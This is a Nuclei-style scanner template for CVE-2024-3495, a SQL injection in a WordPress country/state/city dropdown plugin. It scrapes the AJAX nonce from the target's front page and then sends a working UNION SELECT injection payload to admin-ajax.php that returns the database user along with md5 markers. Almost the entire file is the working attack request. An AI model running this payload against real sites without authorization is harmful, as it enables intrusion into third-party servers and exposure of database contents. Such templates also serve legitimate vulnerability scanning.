id: CVE-2024-3495

info:
  name: Wordpress Country State City Dropdown ===> SQL Injection PART II
  author: ghost_sec
  severity: critical
  metadata:
    verified: true
    max-request: 2
  tags: github.com/fa-rrel ==> WHAT DO YOU THINK ABOUT ME ?

variables:
  num: "999999999"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=tc_csca_get_cities&nonce_ajax={{nonce}}&sid=1+or+0+union+select+concat(0x64617461626173653a,(select%20md5({{num}})),0x7c76657273696f6e3a,(select%20md5({{num}})),0x7c757365723a,user()),2,3--+-

    matchers:
      - type: word
        part: body_2
        words:
          - '{{md5(num)}}'

    extractors:
      - type: regex
        name: nonce
        group: 1
        regex:
          - '"nonce":"(\S*)"'
        internal: true